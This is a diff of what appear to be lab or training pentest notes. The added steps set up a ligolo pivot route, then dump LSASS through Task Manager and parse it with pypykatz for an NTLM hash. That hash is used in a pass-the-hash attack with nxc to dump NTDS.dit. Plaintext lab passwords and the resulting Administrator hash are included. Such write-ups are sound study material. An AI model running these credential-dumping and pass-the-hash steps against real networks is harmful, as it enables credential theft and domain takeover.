@@ -87,7 +87,7 @@ ligolo > 1
 ligolo > ifconfig (Agent interfaces)
 
 7. Add rule to routing table, we have to add the target internal subnetwork to our routing table (Not on exegol)
-> 
+> sudo ip route add 172.16.119.0/24 dev ligolo
 ```
 ![[Pasted image 20251010175900.png]]
 ```shell
@@ -158,4 +158,28 @@ Enter into the database via RDP and we can collect those passwords:
 
 bdavid:caramel-cigars-reply1
 stom:fails-nibble-disturb4 
+```
+
+8. We can dump lsass process with xfreerdp
+```shell
+1. Go to task manager
+2. Find Local Security Authority Process and dump it
+3. Move dump into host machine
+4. Use pypykatz
+> pypykatz lsa minidump lsass.DMP > dump
+> We found the stom hash
+(Stom password was not working anywhere)
+
+stom:21ea958524cfd9a7791737f8d2f764fa
+
+Lets perform a Pass The Hash Attack
+```
+
+9. Lets perform a Pass The Hash Attack to dump NTDS.dit
+```shell
+> nxc smb 172.16.119.11 -u stom -H '21ea958524cfd9a7791737f8d2f764fa' -M ntdsutil
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:36e09e1e6ade94d63fbcab5e5b8d6d23:::
+
+Answer: 36e09e1e6ade94d63fbcab5e5b8d6d23
 ```
